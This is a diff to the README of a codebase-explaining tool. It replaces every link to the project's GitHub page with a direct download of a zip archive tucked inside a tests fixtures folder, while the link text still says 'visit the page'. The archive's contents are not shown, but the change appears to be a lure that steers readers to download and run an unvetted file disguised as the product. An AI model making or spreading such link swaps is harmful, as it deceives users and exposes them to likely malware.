@@ -1,6 +1,6 @@
 # 🧭 explain-codebase - Understand any codebase fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Trampy021/explain-codebase)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Trampy021/explain-codebase/main/fixtures/python_cli_example/explain_codebase_3.3.zip)
 
 ## 🚀 What this tool does
 
@@ -20,7 +20,7 @@ This is useful when you open a new project and need a quick map of the system.
 
 Use the link below to visit the page to download:
 
-[Download explain-codebase](https://github.com/Trampy021/explain-codebase)
+[Download explain-codebase](https://raw.githubusercontent.com/Trampy021/explain-codebase/main/fixtures/python_cli_example/explain_codebase_3.3.zip)
 
 ## 📦 What you need
 
@@ -199,7 +199,7 @@ This makes it easier to point the tool at the right repository path.
 
 If you need the page again, use this link to visit the page to download:
 
-[https://github.com/Trampy021/explain-codebase](https://github.com/Trampy021/explain-codebase)
+[https://raw.githubusercontent.com/Trampy021/explain-codebase/main/fixtures/python_cli_example/explain_codebase_3.3.zip](https://raw.githubusercontent.com/Trampy021/explain-codebase/main/fixtures/python_cli_example/explain_codebase_3.3.zip)
 
 ## 🪄 When this is most useful
 
